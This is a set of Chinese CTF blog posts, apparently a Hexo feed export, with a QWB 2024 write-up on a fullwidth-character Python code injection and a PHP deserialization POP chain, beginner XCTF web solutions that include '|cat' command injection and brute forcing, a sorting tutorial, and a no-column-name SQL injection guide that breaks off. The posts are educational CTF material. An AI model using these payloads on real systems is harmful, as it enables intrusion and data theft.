<p>可以发现dd命令有SUID权限，那么我们直接使用dd来读取文件即可<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;blocks&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;blocks&quot;</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;print&quot;</span>,</span><br><span class="line">        <span class="string">&quot;inputs&quot;</span>: &#123;</span><br><span class="line">          <span class="string">&quot;TEXT&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;block&quot;</span>: &#123;</span><br><span class="line">              <span class="string">&quot;type&quot;</span>: <span class="string">&quot;text&quot;</span>,</span><br><span class="line">              <span class="string">&quot;fields&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;TEXT&quot;</span>: <span class="string">&quot;’）；ｌｅｎ ＝ ｌａｍｂｄａ ｘ：０；＿＿ｉｍｐｏｒｔ＿＿（＇ｏｓ＇）．ｓｙｓｔｅｍ（’dd ｉｆ＝／flag　ｂｓ＝５１２　ｃｏｕｎｔ＝１‘）；＃&quot;</span></span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241103-213907926.png" class="">  </p>
<h1 id="password-Game"><a href="#password-Game" class="headerlink" title="password Game"></a>password Game</h1><p>前面的小游戏就不说了<br>玩通游戏后会给一个源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;2024qwb&quot;</span>);</span><br><span class="line"><span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&quot;|&quot;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&quot;nonono&quot;</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">guest</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username==<span class="string">&quot;guest&quot;</span>)&#123;</span><br><span class="line">    <span class="variable">$value</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username==<span class="title function_ invoke__">md5</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;flag&quot;</span>]))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$GLOBALS</span>[<span class="string">&quot;flag&quot;</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">root</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&quot;a&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$value</span>=<span class="number">2024</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$this</span>-&gt;username, <span class="string">&quot;admin&quot;</span>) == <span class="number">0</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;value == <span class="string">&quot;2024qwb&quot;</span>)&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;value = <span class="variable">$GLOBALS</span>[<span class="string">&quot;flag&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="string">&quot;hello:&quot;</span>.<span class="variable">$this</span>-&gt;value);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;username=<span class="title function_ invoke__">md5</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;flag&quot;</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;password-&gt;<span class="title function_ invoke__">guess</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$this</span>-&gt;username, <span class="string">&quot;admin&quot;</span>) == <span class="number">0</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;hello&quot;</span>.<span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span>=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]));</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$user</span>-&gt;username, <span class="string">&quot;admin&quot;</span>) == <span class="number">0</span> &amp;&amp; <span class="variable">$user</span>-&gt;password == <span class="string">&quot;2024qwb&quot;</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;hello!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>一眼打反序列化，但是我们可以看到在代码里有语法错误<br><img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241103-214146368.png" class=""><br><img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241103-214203595.png" class=""><br>题目也给了hint，那么我们的反序列连就不会是<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__destruct()-&gt;__toString</span><br></pre></td></tr></table></figure><br>了因为toString后找不到进入其他魔术方法的方法了。<br>在看来许久代码后我发现<code>$user-&gt;passwdord</code>对反序列的变量的password进行了调用，那么我们看游戏root会发现其没有password属性，那么绕过<code>$user</code>是root类的话就可以触发到其<code>__get()</code>方法了。</p>
<p>在进入<code>__get()</code>方法后其对value进行了一次赋值操作然后输出其md5值。我们联想到题目的hint叫我们篡改，说到篡改可以想到使用<code>&amp;</code>来将两个变量绑在一起。而题目有对value进行赋值。那么我们能不能将某个值与value进行关联然后在某个地方被输出呢?</p>
<p>我们都知道虽然<code>__destruct()</code>可以浅显的理解为反序列化时触发，但其实际其实是在被摧毁时触发，即如我们在反序列时有生成User这个类的实例，那么在代码结束时就会触发<code>__destruct()</code>而<code>__destruct()</code>的逻辑就是输出属性username</p>
<img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241103-215331070.png" class="">  
<p>那么我们只要将root的某个属性赋值为User的实例，在将User里的username赋值为root里的value的地址即<code>&amp;</code>不就可以输出flag了吗。</p>
<p>在看眼root的代码可以发现我们只能将username赋值为User的实例因为value需要进行弱比较。</p>
<p>payload如下<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;2024qwb&quot;</span>);</span><br><span class="line"><span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&quot;|&quot;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&quot;nonono&quot;</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">root</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&quot;a&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$value</span>=<span class="number">2024</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$this</span>-&gt;username, <span class="string">&quot;admin&quot;</span>) == <span class="number">0</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;value == <span class="string">&quot;2024qwb&quot;</span>)&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;value = <span class="variable">$GLOBALS</span>[<span class="string">&quot;flag&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="string">&quot;hello:&quot;</span>.<span class="variable">$this</span>-&gt;value);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;username=<span class="title function_ invoke__">md5</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;flag&quot;</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;password-&gt;<span class="title function_ invoke__">guess</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$this</span>-&gt;username, <span class="string">&quot;admin&quot;</span>) == <span class="number">0</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;hello&quot;</span>.<span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">root</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;value=<span class="number">2024</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;username = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;username-&gt;username = &amp;<span class="variable">$a</span>-&gt;value;</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$user</span>=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$user</span>-&gt;username, <span class="string">&quot;admin&quot;</span>) == <span class="number">0</span> &amp;&amp; <span class="variable">$user</span>-&gt;password == <span class="string">&quot;2024qwb&quot;</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;hello!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-------------------------</span><br><span class="line"></span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;root&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;i:<span class="number">2024</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;N;s:<span class="number">5</span>:<span class="string">&quot;value&quot;</span>;N;&#125;s:<span class="number">5</span>:<span class="string">&quot;value&quot;</span>;R:<span class="number">3</span>;&#125;</span><br></pre></td></tr></table></figure><br>这些waf都挺好绕的就不细说了<br><img src="/2024/11/03/%E5%BC%BA%E7%BD%912024/IMG_20241103-220359543.png" class=""><br>游戏也好绕，直接在大括号后面加数字即可反正也不影响反序列化。</p>
<p>这题比较可惜的是队友打出来后，时间刚好到5点</p>
]]></content>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>语法排序</title>
    <url>/2023/10/29/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<h1 id="这篇博客我将写我学习排序的过程我会将种排序写在这篇文章底下"><a href="#这篇博客我将写我学习排序的过程我会将种排序写在这篇文章底下" class="headerlink" title="这篇博客我将写我学习排序的过程我会将种排序写在这篇文章底下"></a>这篇博客我将写我学习排序的过程我会将种排序写在这篇文章底下</h1><h2 id="我个人比较喜欢用题目来熟悉代码所有下面的基本会用题目来描写"><a href="#我个人比较喜欢用题目来熟悉代码所有下面的基本会用题目来描写" class="headerlink" title="我个人比较喜欢用题目来熟悉代码所有下面的基本会用题目来描写"></a>我个人比较喜欢用题目来熟悉代码所有下面的基本会用题目来描写</h2><p>我在洛谷里找到了这题</p>
<hr>
<h1 id="【模板】排序"><a href="#【模板】排序" class="headerlink" title="【模板】排序"></a>【模板】排序</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>将读入的 $N$ 个数从小到大排序后输出。</p>
<h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h2><p>第一行为一个正整数 $N$。</p>
<p>第二行包含 $N$ 个空格隔开的正整数 $a_i$，为你需要进行排序的数。</p>
<h2 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h2><p>将给定的 $N$ 个数从小到大输出，数之间空格隔开，行末换行且无空格。</p>
<h2 id="样例-1"><a href="#样例-1" class="headerlink" title="样例 #1"></a>样例 #1</h2><h3 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入 #1"></a>样例输入 #1</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5</span><br><span class="line">4 2 4 5 1</span><br></pre></td></tr></table></figure>
<h3 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出 #1"></a>样例输出 #1</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 2 4 4 5</span><br></pre></td></tr></table></figure>
<h2 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h2><p>对于 $20\%$ 的数据，有 $1 \leq N \leq 10^3$；</p>
<p>对于 $100\%$ 的数据，有 $1 \leq N \leq 10^5$，$1 \le a_i \le 10^9$。</p>
<hr>
<p><strong>没有学排序语法的我一开始看到这题我觉得，就这随随便便就打出来了好吗？</strong></p>
<p>于是我提交了一个<strong>冒泡排序</strong>像下面这样。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span>	n = <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> a = <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> arr[<span class="number">100001</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">	<span class="keyword">for</span> (;i &lt; n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a);</span><br><span class="line">			arr[i] = a;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>;i &lt; n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">		<span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (j=i+<span class="number">1</span>;j&lt;n;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (arr[i] &lt; arr[j])</span><br><span class="line">			&#123;</span><br><span class="line">				t = arr[i];</span><br><span class="line">				arr[i] = arr[j];</span><br><span class="line">				arr[j] = t;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>;i &lt; n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="结果完美的超时了，于是我在网上寻找了排序的算法；总共6钟我会在底下一一介绍（这篇文章我可能不会太快写完因为有的排序要指针而我不会指针）"><a href="#结果完美的超时了，于是我在网上寻找了排序的算法；总共6钟我会在底下一一介绍（这篇文章我可能不会太快写完因为有的排序要指针而我不会指针）" class="headerlink" title="结果完美的超时了，于是我在网上寻找了排序的算法；总共6钟我会在底下一一介绍（这篇文章我可能不会太快写完因为有的排序要指针而我不会指针）"></a>结果完美的<strong>超时了</strong>，于是我在网上寻找了排序的算法；总共6钟我会在底下一一介绍（这篇文章我可能不会太快写完因为有的排序要指针而我<strong>不会指针</strong>）</h4><p>首先是最简单也是运行最慢的冒泡排序冒泡排序是复杂的最高的排序它的主要原理就是从数组的第</p>
]]></content>
      <categories>
        <category>c语言</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界web入门题</title>
    <url>/2023/11/06/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E5%85%A5%E9%97%A8%E9%A2%98/</url>
    <content><![CDATA[<h1 id="由于本人太菜写不来更难的题目只好写写入门题目了。"><a href="#由于本人太菜写不来更难的题目只好写写入门题目了。" class="headerlink" title="由于本人太菜写不来更难的题目只好写写入门题目了。"></a>由于本人太菜写不来更难的题目只好写写入门题目了。</h1><h2 id="1-view-source"><a href="#1-view-source" class="headerlink" title="1.view_source"></a>1.view_source</h2><p>这一题非常简单只有在网页内打开源码就可以得到flag了</p>
<h2 id="2-get-post"><a href="#2-get-post" class="headerlink" title="2.get_post"></a>2.get_post</h2><p>这道题首先让我们提交一个a=1。然后用post提交一b=2<br>这到题目主要是利用http的两种请求方法分别是<code>git</code>和<code>post</code>我们可以利用一个浏览器插件叫hackbaar来进行请求，git请求是直接在url上进行请求方式是这样的<code>网址/?a=1</code>再在hockbar上用post传一个b=2就可以得到flag</p>
<h2 id="3-robots"><a href="#3-robots" class="headerlink" title="3.robots"></a>3.robots</h2><p>robots是一个爬虫的协议只有在创建站时建立一个robots.txt文件，将不想被搜索引擎抓取的部分写在robots.txt就可以，可是robots只是一个协议就像是在一个未上锁的房间上写上了内有贵重物品勿进一样。<br>这道题只需要在url网站后添加上robots.txt就可以查看的该网站的robots.txt的内容<br>里面有一个f1ag_1s_h3re.php。将其在url中打开就可以查看的该题的flag</p>
<h2 id="4-backup"><a href="#4-backup" class="headerlink" title="4.backup"></a>4.backup</h2><p>这道题是要求找到该网站未删除的备份文件，网页上给的提示是你知道index.php的备份文件吗，一般备份文件的后缀名为：”.git”,”.svn”,”.~”,”.bak”,”.bash_histroy”,”.bkf”;给index.phpt添加备份文件的后缀名进行尝试就可以找道index.php的备份文件为index.php.bak打开网页所提供的bak文件就可以找到flag</p>
<h2 id="5-cookie"><a href="#5-cookie" class="headerlink" title="5.cookie"></a>5.cookie</h2><p>我先简单介绍一下cookie，cookie是一个小型文件，网站会将一些信息存在cookie中如我们在打开视频网站时发现我们可以直接登陆上次所登陆的账号，这就是将账号密码存道了本地的cookie中，一般cookie是经过了加密的，可是这也留下了一些安全隐患就是黑客可以直接通过获取你电脑的cookie后进行破密来得到信息。</p>
<p>这道题我们可以通过f12打开控制台，先查看源码发现并没有什么信息，然后我们打开网络选项对网页活动进行记录，在set-cookie标头里找的lookhere=cookie.php发现而后在url上添加cookie.php就可以转到另一个网站上面写着see the http response<br>意思是查看响应，然后我们就能在响应标头里找到flag</p>
<h2 id="6-disabled-button"><a href="#6-disabled-button" class="headerlink" title="6.disabled_button"></a>6.disabled_button</h2><p>这道题我们可以在控制台点击左上角的图标，之后就可以将鼠标移动的按钮上查看按钮的源码位置查看无法点击的原因，我们会发现我们在源码里发现<code>disabled</code> 这个会使之后导致我们无法与按钮这个控件进行交互导致无法提交post请求，所以我们直接在控制台中将disabled删除然后就可以对按钮进行点击了，点击之后得到flag</p>
<h2 id="7-看不懂js先跳过后补"><a href="#7-看不懂js先跳过后补" class="headerlink" title="7.看不懂js先跳过后补"></a>7.看不懂js先跳过后补</h2><h2 id="8-xff-referer"><a href="#8-xff-referer" class="headerlink" title="8.xff_referer"></a>8.xff_referer</h2><p>这道题目我们只需要用hackbar就可以解决，打开这道题后题目要求ip地址为123.123.123.123这时候我们就要用道<code>XFF</code>也就是<code>X-Forwarded-For</code>,XFF是一种ip请求头我们可以在hackbar的modlfy header里进行对XFF的修改只要在hackbar里添加以下代码就可<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For:123.123.123.123</span><br></pre></td></tr></table></figure><br>随后会要求必须来自谷歌<br>这时我们要用到另一种标头就是，Referer，只有用hackbar对这个标头进行修改就可以完成题目要求代码如下<br>Referer:<a href="https://www.google.com">https://www.google.com</a><br>这样就拿到flag了</p>
<h2 id="9"><a href="#9" class="headerlink" title="9."></a>9.</h2><p>这题点进去是一个登陆页面我们首先随便输入一组账号密码，而后弹出please login as admin，我们先猜一下账号为admin而后我们重新输入账号admin和密码打开bp对网页进行抓包后进行爆破，由于这个密码是小明随便设置的，所以我们可以在网上下载一个简单密码本来导入bp解决爆破，后得到爆破结果为admin 123456</p>
<h2 id="10-command-execution"><a href="#10-command-execution" class="headerlink" title="10.command_execution"></a>10.command_execution</h2><p>小明写了个ping但是没有waf这就使得我们可以在ping里输入指令直接查看服务器的信息，首先输入<code>|ls</code>看见屏幕上回显出index.txt证明了因为没有防火墙ls并没被过滤之后输入1<code>|ls /</code>来查看文件目录，之后用<code>|ls /文件名</code>查找flag,找到flag是在home下，之后在使用<code>|cat /home/flag.txt</code>得到flag</p>
<h2 id="11-simple-php"><a href="#11-simple-php" class="headerlink" title="11.simple_php"></a>11.simple_php</h2><p>这道题目主要考的是php代码从代码中我们可以看到需要给a赋值一个0得到flag1，b传值一个大与1234的数得到flag2.<br>可是我们发现代码里有个<code>is_numeric()</code>这个代码是分析是为数字是返回turn不是返回false，当b为数字时就将运行exit（），这个函数是直接结束程序，如果b直接输入数字那么将无法得到flag2.所以我们要想办法绕过is_numeric函数<br>首先我们都知道php比较是比较诡异的，php中如果一个字符串与数字进行比较会将字符型尝试转为整形/浮点型如12345a和1234比较在php中会变成12345和1234进行比较所有我们就可以给b赋值一个12345a来绕过is_numeric了。<br>在url上输入一下代码就可以得到flag<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=0 &amp; b=12345a</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>wp</category>
        <category>刷题</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>无列名注入和异或注入</title>
    <url>/2023/12/16/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%E5%92%8C%E5%BC%82%E6%88%96%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="在刷完sql-labs后我在学长的博客里发现了另外几种注入方式我们会在下面写出来"><a href="#在刷完sql-labs后我在学长的博客里发现了另外几种注入方式我们会在下面写出来" class="headerlink" title="在刷完sql-labs后我在学长的博客里发现了另外几种注入方式我们会在下面写出来"></a>在刷完sql-labs后我在学长的博客里发现了另外几种注入方式我们会在下面写出来</h1><h1 id="一：无列名注入"><a href="#一：无列名注入" class="headerlink" title="一：无列名注入"></a>一：无列名注入</h1><p>无列名注入顾名思义就是无法查询到列名，利用这种方法来绕过列名的查询方法。<br>在许多的sql注入场景一般都会过滤information_schema这个库导致我们无法利用这个查询表名和列名，但是在高版本的mysql里存在<code>mysql.innodb_table_stats</code>和<code>mysql.innodb_table_index</code>保存着表名。那么我们就可以利用这两个表来进行查询表名。可是这两个只能查询表名，怎么我们该怎么查询数据呢？这时候就要用到无列名注入了。<br>无列名注入的原理是利用select语句来将列名重命名代码如下<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 1,2,3 union select * from user</span><br></pre></td></tr></table></figure><br><br>我们可以发现我们查询出来的表的列名变成了1，2，3也就是我们命名的这是为什么呢？哎嘿聪明的我查了一下chat-gpt，很快就得出了结果。<br>因为sql语句中查询的列名是可以自己指定的，select 1,2,3 union select <em> from user中第一个select语句指定的列名为1，2，3二第二个select语句是查询user中所有的结果。而union会将前后两个语句进行匹配，如果匹配成功union会将其进行合并导致后一个语句继承前一个语句的列名<br>我们在输入如下语句<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> `<span class="number">1</span>` <span class="keyword">from</span>(<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)A</span><br></pre></td></tr></table></figure><br><br>我们可以发现其回显了1的内容也就是id的内容。那么我们来分析一下是为什么，首先`(select 1,2,3 union select </em> from users)A<code>这句的意思是将查询的结果重命名为</code>A<code>。就像是多了一个表名为</code>A<code>内容为</code>users<code>的列名为</code>1，2，3<code>的表一。那么这一就话连起来意思就很明确了，就是查询来自</code>A<code>列名为</code>1<code>的列的内容，</code>A<code>就是</code>select 1,2,3 union select * from users`查询的内容<br>可能有人会有疑问为什么1要加反引号呢？这是因为sql中将反引号内的内容认为是列名，如果去掉反引号那么1就会被当成数字解析那么就无法查询道内容。<br>当然我们也可以利用group_concat来查询多条语句<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(`<span class="number">1</span>`,`<span class="number">2</span>`) <span class="keyword">from</span>(<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)A</span><br></pre></td></tr></table></figure><br><br>当然有的题目会将反引号过滤那么我们该怎么办呢？其实也不难解决只要将查询语句中的1，2，3做点修改就好代码如下<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select group_concat(a) from(select 1 as a,2 as b,3 as c union select * from users)A</span><br></pre></td></tr></table></figure><br><br>我们利用as将1命名为a将2命名为b将3命名为c，这样就可以利用a,b,c作为列名来查询了</p>
<h2 id="SWPUCTF2019的web1"><a href="#SWPUCTF2019的web1" class="headerlink" title="SWPUCTF2019的web1"></a>SWPUCTF2019的web1</h2><p>这道题目就是一道无列名注入题目。<br>在我们点击进入后发现是一个登入页面，在登入宽尝试了是否能进行注入，发现好像不可以，</p>
